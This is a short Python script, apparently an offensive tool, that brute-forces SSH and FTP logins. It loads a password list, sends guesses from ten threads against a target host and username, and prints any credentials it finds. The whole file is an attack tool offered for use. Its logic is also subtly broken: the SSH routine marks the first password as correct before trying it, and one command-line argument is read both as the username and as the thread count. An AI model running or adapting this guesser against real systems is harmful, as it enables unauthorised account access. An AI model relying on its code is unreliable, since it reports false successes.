import ftplib
import paramiko
import threading, queue, sys, socket
from time import sleep

threads = sys.argv[2]
guessed = False
correct_password = ''

def ssh_guesser(hostname, username):
    global guessed,correct_password
    sshclient = paramiko.SSHClient()
    sshclient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    while not guessed and not q.empty():
        password = q.get()
        print(f"Guessing password: {password}")
        guessed = True
        correct_password = password

        try:
            sshclient.connect(hostname=hostname, username=username, password=password, timeout=2)
            print(f"[+] Correct combination found \nusername:{username}\npassword:{password} ")

        except socket.timeout:
            print("[+] Host is unreachable. Existing...")
            exit(0)
        except paramiko.SSHException:
            print("[+] Quota excedding Retrying after 2 sec")
            sleep(2)
            return ssh_guesser(hostname, username)
    q.task_done()

def ftp_guesser(hostname, username):
    global guessed, correct_password
    ftpclient = ftplib.FTP()
    while not guessed and not q.empty():
        password = q.get()
        print(f"Guessing password: {password}")
        try:
            ftpclient.connect(hostname, 21, timeout=3)
            ftpclient.login(username, password)
            print(f"[+] Found valid \nUsername: {username} \nPassword: {password}")
            guessed = True
            correct_password = password

        except:
            pass
    q.task_done()
    

q = queue.Queue()

hostname = sys.argv[1]
username = sys.argv[2]
type = sys.argv[3]

if type == "ssh":
    with open("passwordlist.txt", "r") as file:
        for password in file.read().splitlines():
            q.put(password)

    for thread in range(10):
        t = threading.Thread(target=ssh_guesser, args=(hostname, username))
        t.start()

if type == "ftp":
    with open("passwordlist.txt", "r") as file:
        for password in file.read().splitlines():
            q.put(password)

    for thread in range(10):
        t = threading.Thread(target=ftp_guesser, args=(hostname, username))
        t.start()

while True:
    if guessed == True:
        print(f"[+] Valid login details found: \nUsername: {username}\nPassword: {correct_password}")
        exit()
    elif guessed == False and q.empty():
        print("Cannot find valid password")
        exit()